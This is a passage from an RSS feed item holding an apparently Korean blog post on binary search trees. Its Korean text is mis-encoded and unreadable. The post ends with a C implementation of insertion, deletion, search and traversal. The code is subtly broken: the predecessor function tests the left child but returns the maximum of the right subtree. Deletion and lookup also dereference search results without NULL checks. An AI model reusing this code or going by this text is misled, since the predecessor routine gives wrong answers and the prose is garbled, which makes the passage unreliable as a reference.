ê²°ê³¼</a>, <code>std::set</code> ì˜ êµ¬í˜„ì— ìê°€ ê· í˜• ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ì˜ ì¼ì¢…ì¸ ë ˆë“œ-ë¸”ë™ íŠ¸ë¦¬(red-black tree)ë¥¼ ì‚¬ìš©í•˜ê³  ìˆì—ˆë‹¤ê³  í•©ë‹ˆë‹¤.</p><h2 id="%EC%B0%B8%EA%B3%A0%EC%9E%90%EB%A3%8C" tabindex="-1">ì°¸ê³ ìë£Œ</h2><p>[1] T.H. Corman, C.E. Leiserson, R.L. Rivest and C. Stein, â€œBinary Search Trees,â€ in <em>Introduction to Algorithms</em>, 3rd ed. Cambridge, MA: MIT Press, 2009, pp. 286-298.</p><h2 id="%EB%B6%80%EB%A1%9D" tabindex="-1">ë¶€ë¡</h2><h3 id="%EC%9D%B4%EC%A7%84-%ED%83%90%EC%83%89-%ED%8A%B8%EB%A6%AC-%EA%B5%AC%ED%98%84-%EC%BD%94%EB%93%9C" tabindex="-1">ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ êµ¬í˜„ ì½”ë“œ</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Definitions */</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line"><span class="type">int</span> key, value;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">left</span>, *<span class="title">right</span>, *<span class="title">parent</span>;</span></span><br><span class="line">&#125; Node;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BinarySearchTree</span> &#123;</span></span><br><span class="line">Node *root;</span><br><span class="line">&#125; BST;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Internal Functions */</span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> __tree_walk(Node *x) &#123;</span><br><span class="line"><span class="keyword">if</span> (x != <span class="literal">NULL</span>) &#123;</span><br><span class="line">__tree_walk(x-&gt;left);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, x-&gt;key, x-&gt;value);</span><br><span class="line">__tree_walk(x-&gt;right);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Node *__tree_search(Node *x, <span class="type">int</span> key) &#123;</span><br><span class="line"><span class="keyword">while</span> (x != <span class="literal">NULL</span> &amp;&amp; x-&gt;key != key) &#123;</span><br><span class="line">x = (key &lt; x-&gt;key) ? x-&gt;left : x-&gt;right;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Node *__tree_min(Node *x) &#123;</span><br><span class="line"><span class="keyword">while</span> (x-&gt;left != <span class="literal">NULL</span>) &#123;</span><br><span class="line">x = x-&gt;left;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Node *__tree_max(Node *x) &#123;</span><br><span class="line"><span class="keyword">while</span> (x-&gt;right != <span class="literal">NULL</span>) &#123;</span><br><span class="line">x = x-&gt;right;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Node *__tree_predecessor(Node *x) &#123;</span><br><span class="line">Node *y = x-&gt;parent;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (x-&gt;left != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> __tree_max(x-&gt;right);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (y != <span class="literal">NULL</span> &amp;&amp; x == y-&gt;left) &#123;</span><br><span class="line">x = y;</span><br><span class="line">y = y-&gt;parent;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Node *__tree_successor(Node *x) &#123;</span><br><span class="line">Node *y = x-&gt;parent;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (x-&gt;right != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> __tree_min(x-&gt;right);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (y != <span class="literal">NULL</span> &amp;&amp; x == y-&gt;right) &#123;</span><br><span class="line">x = y;</span><br><span class="line">y = y-&gt;parent;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> __transplant(BST *bst, Node *u, Node *v) &#123;</span><br><span class="line"><span class="keyword">if</span> (u-&gt;parent == <span class="literal">NULL</span>) &#123;</span><br><span class="line">bst-&gt;root = v;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (u == u-&gt;parent-&gt;left) &#123;</span><br><span class="line">u-&gt;parent-&gt;left = v;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">u-&gt;parent-&gt;right = v;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (v != <span class="literal">NULL</span>) &#123;</span><br><span class="line">v-&gt;parent = u-&gt;parent;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Exposed Functions */</span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(BST *bst)</span> &#123;</span><br><span class="line">__tree_walk(bst-&gt;root);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Node *<span class="title function_">prev</span><span class="params">(BST *bst, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">Node *x = __tree_search(bst-&gt;root, key);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> __tree_predecessor(x);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Node *<span class="title function_">next</span><span class="params">(BST *bst, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">Node *x = __tree_search(bst-&gt;root, key);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> __tree_successor(x);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">insert</span><span class="params">(BST* bst, <span class="type">int</span> key, <span class="type">int</span> value)</span> &#123;</span><br><span class="line">Node *newnode = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">Node *x = bst-&gt;root, *y = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">*newnode = (Node) &#123; key, value, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line"><span class="keyword">while</span> (x != <span class="literal">NULL</span>) &#123;</span><br><span class="line">y = x;</span><br><span class="line">x = (newnode-&gt;key &lt; x-&gt;key) ? x-&gt;left : x-&gt;right;</span><br><span class="line">&#125;</span><br><span class="line">newnode-&gt;parent = y;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (y == <span class="literal">NULL</span>) &#123;<span class="comment">// bst is empty</span></span><br><span class="line">bst-&gt;root = newnode;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (newnode-&gt;key &lt; y-&gt;key) &#123;</span><br><span class="line">y-&gt;left = newnode;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">y-&gt;right = newnode;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">(BST *bst, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">Node *x = __tree_search(bst-&gt;root, key), *y;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (x-&gt;left == <span class="literal">NULL</span>) &#123;</span><br><span class="line">__transplant(bst, x, x-&gt;right);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (x-&gt;right == <span class="literal">NULL</span>) &#123;</span><br><span class="line">__transplant(bst, x, x-&gt;left);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">y = __tree_min(x-&gt;right);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (y-&gt;parent != x) &#123;</span><br><span class="line">__transplant(bst, y, y-&gt;right);</span><br><span class="line">y-&gt;right = x-&gt;right;</span><br><span class="line">y-&gt;right-&gt;parent = y;</span><br><span class="line">&#125;</span><br><span class="line">__transplant(bst, x, y);</span><br><span class="line">y-&gt;left = x-&gt;left;</span><br><span class="line">y-&gt;left-&gt;parent = y;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Driver Code */</span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> arr[<span class="number">10</span>] = &#123; <span class="number">5</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">8</span> &#125;;</span><br><span class="line">BST bst = &#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">insert(&amp;bst, arr[i], arr[i]);</span><br><span class="line">&#125;</span><br><span class="line">print(&amp;bst);</span><br><span class="line"> </span><br><span class="line">delete(&amp;bst, <span class="number">3</span>);</span><br><span class="line">delete(&amp;bst, <span class="number">2</span>);</span><br><span class="line">delete(&amp;bst, <span class="number">1</span>);</span><br><span class="line">insert(&amp;bst, <span class="number">11</span>, <span class="number">11</span>);</span><br><span class="line">insert(&amp;bst, <span class="number">12</span>, <span class="number">12</span>);</span><br><span class="line">insert(&amp;bst, <span class="number">13</span>, <span class="number">13</span>);</span><br><span class="line">print(&amp;bst);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content:encoded>
      
      
      <category domain="https://juhyun167.github.io/categories/Computer-Science/">Computer Science</category>
      
      <category domain="https://juhyun167.github.io/categories/Computer-Science/Data-Structures/">Data Structures</category>
      
      
      
      <comments>https://juhyun167.github.io/2022/06/08/binary-search-tree/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
